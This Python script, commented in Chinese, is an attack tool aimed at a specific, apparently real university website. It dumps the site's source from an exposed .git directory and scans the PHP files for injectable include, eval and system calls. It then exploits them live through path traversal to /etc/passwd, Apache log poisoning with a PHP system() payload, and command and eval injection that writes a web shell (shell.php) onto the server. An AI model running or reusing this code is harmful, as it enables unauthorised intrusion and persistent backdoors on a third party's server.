#!/usr/bin/env python3
import zlib
import requests
import re
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://olympic.su.ac.th'

# 递归遍历所有目录
def walk_tree(tree_hash, path=""):
    tree_path = f'/.git/objects/{tree_hash[:2]}/{tree_hash[2:]}'
    resp = requests.get(url + tree_path, verify=False, timeout=10)
    if resp.status_code != 200:
        return [], []
    try:
        tree_data = zlib.decompress(resp.content)
    except:
        return [], []
    null1 = tree_data.find(b'\0')
    if null1 == -1:
        return [], []
    pos = null1 + 1
    files = []
    dirs = []
    while pos < len(tree_data):
        null2 = tree_data.find(b'\0', pos)
        if null2 == -1 or null2 + 21 > len(tree_data):
            break
        mode_name = tree_data[pos:null2]
        parts = mode_name.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            hash_hex = tree_data[null2+1:null2+21].hex()
            full_path = f"{path}/{filename}" if path else filename
            if mode == '40000':
                dirs.append((full_path, hash_hex))
            elif filename.endswith('.php'):
                files.append((full_path, hash_hex))
            pos = null2 + 21
        else:
            break
    # 递归处理目录
    for dir_path, dir_hash in dirs:
        sub_files, sub_dirs = walk_tree(dir_hash, dir_path)
        files.extend(sub_files)
        dirs.extend(sub_dirs)
    return files, dirs

print("[*] 遍历所有目录...")
tree_hash = "206be85b2f5820dcbb812b49c73c77c48027d4d3"
all_files, all_dirs = walk_tree(tree_hash)

print(f"\n[+] 找到 {len(all_files)} 个PHP文件")
print(f"[+] 找到 {len(all_dirs)} 个目录")

print("\n所有PHP文件:")
for fpath, _ in all_files:
    print(f"  {fpath}")

# 分析每个文件查找漏洞
print("\n" + "="*70)
print("漏洞分析:")
print("="*70)

def download_file(file_hash):
    blob_path = f'/.git/objects/{file_hash[:2]}/{file_hash[2:]}'
    resp = requests.get(url + blob_path, verify=False, timeout=10)
    if resp.status_code == 200:
        try:
            blob_data = zlib.decompress(resp.content)
            null_blob = blob_data.find(b'\0')
            if null_blob != -1:
                return blob_data[null_blob+1:].decode('utf-8', errors='ignore')
        except:
            pass
    return None

for file_path, file_hash in all_files:
    content = download_file(file_hash)
    if not content:
        continue
    
    # 检查文件包含
    if 'include' in content or 'require' in content:
        # 查找用户输入控制的include
        include_pattern = r'(include|require)[^;]*\$[^;]*;'
        matches = re.findall(include_pattern, content, re.IGNORECASE)
        if matches:
            params = re.findall(r'\$_(GET|POST|REQUEST|COOKIE)\[["\']([^"\']+)["\']\]', content)
            if params:
                print(f"\n[!] 文件包含漏洞: {file_path}")
                print(f"    参数: {params[:5]}")
                # 测试
                web_path = file_path.lstrip('/')
                for param_type, param_name in params[:2]:
                    test_url = f"{url}/{web_path}?{param_name}=../../../../etc/passwd"
                    resp = requests.get(test_url, verify=False, timeout=5)
                    if "root:" in resp.text and resp.status_code == 200:
                        print(f"    [+] 文件包含成功: {test_url}")
                        # 尝试日志包含
                        php_code = "<?php system($_GET['c']); ?>"
                        requests.get(f"{url}/{web_path}?{param_name}={php_code}", verify=False, timeout=5)
                        log_url = f"{url}/{web_path}?{param_name}=../../../../var/log/apache2/access.log&c=id"
                        shell_resp = requests.get(log_url, verify=False, timeout=5)
                        if "uid=" in shell_resp.text:
                            print(f"    [+] Shell获取成功: {log_url}")
                            exit(0)
    
    # 检查eval
    if 'eval' in content.lower():
        if re.search(r'eval\s*\([^)]*\$', content, re.IGNORECASE):
            params = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
            if params:
                print(f"\n[!] eval RCE漏洞: {file_path}")
                print(f"    参数: {params[:5]}")
                web_path = file_path.lstrip('/')
                for param_type, param_name in params[:2]:
                    test_url = f"{url}/{web_path}?{param_name}=system('id');"
                    resp = requests.get(test_url, verify=False, timeout=5)
                    if "uid=" in resp.text:
                        print(f"    [+] RCE成功: {test_url}")
                        shell_cmd = f"file_put_contents('shell.php','<?php system($_GET[c]); ?>');"
                        shell_url = f"{url}/{web_path}?{param_name}={shell_cmd}"
                        requests.get(shell_url, verify=False, timeout=5)
                        test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                        if "uid=" in test_shell.text:
                            print(f"    [+] Shell获取成功: {url}/shell.php?c=id")
                            exit(0)
    
    # 检查system/exec
    if 'system' in content.lower() or 'exec' in content.lower():
        if re.search(r'(system|exec)\s*\([^)]*\$', content, re.IGNORECASE):
            params = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
            if params:
                print(f"\n[!] 命令执行漏洞: {file_path}")
                print(f"    参数: {params[:5]}")
                web_path = file_path.lstrip('/')
                for param_type, param_name in params[:2]:
                    test_url = f"{url}/{web_path}?{param_name}=id"
                    resp = requests.get(test_url, verify=False, timeout=5)
                    if "uid=" in resp.text:
                        print(f"    [+] 命令执行成功: {test_url}")
                        shell_cmd = "echo '<?php system($_GET[c]); ?>' > shell.php"
                        shell_url = f"{url}/{web_path}?{param_name}={shell_cmd}"
                        requests.get(shell_url, verify=False, timeout=5)
                        test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                        if "uid=" in test_shell.text:
                            print(f"    [+] Shell获取成功: {url}/shell.php?c=id")
                            exit(0)

print("\n[-] 审计完成，未发现可直接利用的漏洞")
